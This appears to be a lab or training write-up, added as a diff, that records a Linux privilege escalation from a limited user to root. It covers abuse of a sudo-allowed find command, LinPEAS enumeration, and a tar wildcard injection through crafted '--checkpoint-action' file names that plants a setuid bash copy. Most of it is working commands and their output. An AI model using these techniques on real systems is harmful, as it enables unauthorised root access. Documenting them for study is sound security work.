@@ -1,0 +1,56 @@
+Session 23: Climbing the Ladder - Privilege Escalation Path
+
+1. Sudo Misconfiguration:
+The limited_user account was allowed to run /usr/bin/find as root without a password.
+
+Command used:
+sudo -l
+
+Finding:
+(root) NOPASSWD: /usr/bin/find
+
+Exploit command:
+sudo find . -exec /bin/sh -p \; -quit
+
+Proof:
+whoami
+root
+
+2. Automated Enumeration:
+I ran LinPEAS to search for privilege escalation paths.
+
+Command used:
+cd ~/Linux_PrivEsc/
+./linpeas.sh
+
+Finding:
+A root-owned cron job was found running every minute.
+
+Cron job:
+* * * * * root /usr/local/bin/backup.sh
+
+3. Cron Job Wildcard Injection:
+The writable folder was:
+/home/limited_user/backups
+
+Commands used:
+cd /home/limited_user/backups
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh
+touch ./"--checkpoint=1"
+touch ./"--checkpoint-action=exec=sh runme.sh"
+
+4. Proof of Root Access:
+Command used:
+ls -l /tmp/rootbash
+
+Output:
+-rwsr-sr-x 1 root root 1446024 May 6 19:25 /tmp/rootbash
+
+Root shell command:
+/tmp/rootbash -p
+
+Proof command:
+id
+
+Proof output:
+uid=1001(limited_user) gid=1001(limited_user) euid=0(root) egid=0(root) groups=0(root),1001(limited_user)
